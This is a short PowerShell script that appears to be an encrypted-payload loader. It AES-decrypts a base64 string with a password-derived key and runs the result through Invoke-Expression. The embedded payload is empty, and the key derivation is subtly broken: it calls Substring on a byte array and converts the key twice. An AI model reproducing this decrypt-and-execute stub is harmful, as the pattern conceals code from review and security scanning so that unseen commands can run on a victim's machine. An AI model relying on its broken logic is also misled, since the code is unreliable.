
param([string]$d)
if (-not $d) {
    Write-Error "Missing password. Use: -d <password>"
    exit 1
}

function Decrypt-Payload($enc, $pwd) {
    $bytes = [Convert]::FromBase64String($enc)
    $iv = $bytes[0..15]
    $cipher = $bytes[16..($bytes.Length - 1)]
    $key = [System.Text.Encoding]::UTF8.GetBytes(
        ([System.BitConverter]::ToString(
            [System.Security.Cryptography.SHA256]::Create().ComputeHash(
                [System.Text.Encoding]::UTF8.GetBytes($pwd))
        )).Replace("-", "")).Substring(0, 32)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
    $aes.IV = $iv

    $decryptor = $aes.CreateDecryptor()
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, 'Write')
    $cs.Write($cipher, 0, $cipher.Length)
    $cs.Close()
    return [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
}

$decrypted = Decrypt-Payload -enc '' -pwd $d
Invoke-Expression $decrypted
